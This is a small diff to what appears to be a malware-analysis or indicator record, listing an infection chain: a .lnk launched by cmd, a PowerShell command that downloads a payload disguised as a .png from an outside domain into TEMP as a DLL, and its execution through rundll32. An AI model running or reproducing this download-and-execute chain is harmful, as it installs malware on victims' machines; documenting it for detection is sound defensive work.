@@ -17,7 +17,7 @@ cmd /c C:\Users\Admin\AppData\Local\Temp\firm146.lnk
 
 powershell.exe -NoExit iwr -Uri https://oleitikocottages.com/r4i9PRpVt/S.png -OutFile $env:TEMP\kol.dll;Start-Process rundll32.exe $env:TEMP\kol.dll,kjhbhkjvydrt
 
-"C:\Windows\system32\rundll32.exe" C:\Users\Admin\AppData\Local\Temp\kol.dll kjhbhkjvydrt 
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\kol.dll kjhbhkjvydrt 
 
 *************************************************
 
